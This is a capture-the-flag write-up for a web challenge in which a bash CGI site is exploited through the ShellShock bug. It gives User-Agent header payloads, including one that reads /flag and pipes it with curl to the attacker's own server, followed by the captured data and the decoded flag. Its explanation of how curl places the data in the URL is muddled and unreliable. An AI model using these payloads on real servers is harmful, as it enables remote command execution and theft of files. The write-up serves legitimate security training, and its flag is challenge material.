#SimpleWeb

**Category:** Web
**Points:** 40

**Description:**

You know i am a little noob in web developing. so i just started to create a simple web. But yesterday this crazy friend of mine shocked me to death and said he just hacked my webpage and can read all of my files. VOW! how the hell he did that. can you check it out. for example can you see what is in /flag to prove me he is right.

##SimpleWeb-Solution:

The challenge is created using bash & cgi. Website is very simple and contains nothing just a bunch of static pages. 
There is a hint in description of challenge that says: ```... But yesterday this crazy friend of mine shocked me to death ....``` and will remind us the ShellShock vulnerability that could lead to code execution on server running with bash.

One of the methods to exploit using shellshock, is setting shellshock magic code ```() { :; };``` in user-agent field of http-request-header.
So let's test it. 

Fire up something like tamper-data or burpsuite and set code below in user-agent:

```
() { :; } ; /bin/bash -c "cat /flag"
```

we will get a error result and will not see what is in ```/flag``` file.

```html
<h1>Internal Server Error</h1>
<p>The server encountered an internal error or
misconfiguration and was unable to complete
your request.</p>
<p>Please contact the server administrator at 
 webmaster@localhost to inform them of the time this error occurred,
 and the actions you performed just before this error.</p>
<p>More information about this error may be available
in the server error log.</p>
<hr>
<address>Apache/2.4.7 (Ubuntu) Server at 192.168.32.136 Port 80</address>
```

Running some other commands, we can see that using ```ping``` will give us a huge hint:

```
() { :; } ; /bin/bash -c "ping -c 10 google.com"
```

By executing this command, page will be loaded after 10 ping request sent. So we definetly sure that this is ShellShock vulnerability and flag is only accessible by exploiting it.
There is no way to see the contents of ```/flag``` in the response, so we should find a way to read flag.

***Magic Solution***
------
What if we read ```/flag``` file, but doesn't show it's content in the response? What if we send this result back to our server.
YES.

####The solution is to read /flag, then send that result to our server using something like curl and on our server setup wireshark or read access.log file.

By using this command and firing up wireshark on our server, we could get the flag:

```
() { :; } ; /bin/bash -c "cat /flag | curl -X GET -d @- http://<our server address>"
```

This command will read contents of ```/flag``` and will pipe it into curl. curl will use this value and will send  a ```GET``` request to our server like this:

```
curl -X GET http://<our server address>/<contents of "/flag">
```

On the other hand if we check our server log-files or wireshark/tshark output, we will see a GET request for a url like below:

```
http://simpleweb.iutcert.io/Q2hldCBSYW1leSBpcyB0aGUgbWFpbnRhaW5lciBvZiBTaGVsbFNob2NrIHZ1bG5lcmFiaWxpdHkuIGZsYWcgaXMgU2gzbGw1aDBDS180MW0wNTdfayExMTNkX0I0NUhISAo
```

So the directory after simpleweb.iutcert.io, is actually the contents of ```/flag```:

```
Q2hldCBSYW1leSBpcyB0aGUgbWFpbnRhaW5lciBvZiBTaGVsbFNob2NrIHZ1bG5lcmFiaWxpdHkuIGZsYWcgaXMgU2gzbGw1aDBDS180MW0wNTdfayExMTNkX0I0NUhISAo=
```

it's obvious that it is base64-encoded. decoding it will give us:

```
Chet Ramey is the maintainer of ShellShock vulnerability. flag is Sh3ll5h0CK_41m057_k!113d_B45HHH
```

And the flag is: 
**Sh3ll5h0CK_41m057_k!113d_B45HHH**


